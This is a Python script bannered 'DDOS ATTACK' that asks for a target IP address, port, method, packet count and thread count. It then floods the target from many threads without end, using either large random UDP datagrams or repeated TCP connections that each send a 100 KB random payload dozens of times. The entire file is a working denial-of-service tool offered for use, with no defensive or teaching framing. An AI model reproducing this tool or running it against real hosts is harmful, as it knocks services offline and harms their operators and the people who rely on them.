#!/usr/bin/env python3
#Code by LeeOn123 Remake & Upgrade Tools By Igametopia
import os
import sys
import random
import socket
import threading
import time



print("""

         
\033[93m░█▀▀▄ ░█▀▀▄ █▀▀█ █▀▀ 
░█─░█ ░█─░█ █──█ ▀▀█ 
░█▄▄▀ ░█▄▄▀ ▀▀▀▀ ▀▀▀ 

─█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ─█▀▀█ ░█▀▀█ ░█─▄▀ 
░█▄▄█ ─░█── ─░█── ░█▄▄█ ░█─── ░█▀▄─ 
░█─░█ ─░█── ─░█── ░█─░█ ░█▄▄█ ░█─░█                  
                                                                             """)




ip = str(input("\033[91m>> IP Address :"))
port = int(input("\033[91m>> Port : "))
choice = str(input("\033[91m>> Method : "))
times = int(input("\033[91m>> Packets : "))
threads = int(input("\033[91m>> Threads : "))
def run():
	data = random._urandom(600000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i + "\033[92m Sent!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(100048)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((ip,port))
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			for x in range(times):
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
			print(i +" \033[92m OMO TNEKT!!!")
		except:
			s.close()
			print("\033[92m TEAM X IN ATTACK " + ip)
			print()

for y in range(threads):
	if choice == "y":
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()

